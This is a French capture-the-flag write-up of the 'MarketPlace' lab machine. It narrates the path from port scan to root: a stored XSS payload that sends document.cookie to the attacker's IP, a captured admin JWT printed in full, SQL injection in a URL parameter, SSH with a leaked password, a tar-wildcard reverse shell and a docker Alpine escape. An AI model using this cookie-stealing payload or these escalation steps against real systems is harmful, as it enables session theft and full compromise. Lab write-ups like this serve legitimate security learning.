@@ -1,0 +1,49 @@
+MarketPlace 
+
+ip machine : 10.10.121.75
+ip nous : 10.10.52.85
+
+nmap :
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    nginx 1.19.2
+
+etape 1 : aller sur firefox pour voir a quoi ressemble la page
+on a créé un compte (vilain, Gaston&Juliette) et on se balade dans tous les onglets de l'appl web
+
+les ' dans les boites de dialogues ne sont pas concluantes
+dans new listing, on essaye un script alert (img1&2)
+
+on voit que les sessions font toutes appel a des cookies token
+on cree un fichier.php pour les intercepter (img3)
+on cree un new listing avec un description script (img4) : <script>document.location='http://10.10.52.85:1234/cookie_stealer.php?c=%27+document.cookie</script>
+
+on recupère le cookie admin grace au report et à un nc -nlvp 1234 (img5): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MzMwNzIwNDh9.QjkiatqUkZI1C_ZfZglZ_Vxpib4Y60zS2VLtZoSCUl8
+
+on va dans la page reservé aux admins grace à notre cookie recuperé precedemment (img6). (on l'envoie dans la requete burp)
+
+on tante une injection sql directement dans l'url (user='). pour avoir un detail de l'erreur, on se simule admin grace au cookie. (img7)
+
+via un curl, on recupere au fur et a mesure, des infos sur la bdd de l'application. (img8) (marketplace -> item, users, messages) (img9) (users -> id, isAdministrator, password, username) (img10)
+on recupere ensuite tous les usernames : (img11)
+et tous les password : (img12) ... ils ne sont pas en clair
+
+avec un peu de chance, l'un des utilisateur a envoyé son mdp par message. Et oui ! 
+on crée donc une connection ssh grace a cet user (im13)
+et notre flag 2 est recupere
+
+Machine éteinte, on reprend avec les adresses suivantes :
+machine : 10.10.65.158
+nous : 10.10.123.158
+
+on cherche un autre utilisateur afin d'fectuer un deplacemment lateral.
+(img14)
+on trouve michael. il fait paprtie du group docker.
+nous utilisons la commande find pour trouver ses fichiers (img15&16)
+nous voyons une fichier interressant : backup.sh
+en le lisant, on trouve un .tar
+les .tar sont plein de vulnerabilités, essayons de l'utiliser pour lancer un reverse shell !
+ça marche ! (img17)
+Maintenant, nous allons essayer de trouver une faille sur le docker
+en passant par le shell de michael.
+on affiche les images sur ce docker. Il y a Alpine, on la connait, grace a elle, on va pouvoir recuperer un shell en root ! (grace a du python)
+et on trouve le dernier flag
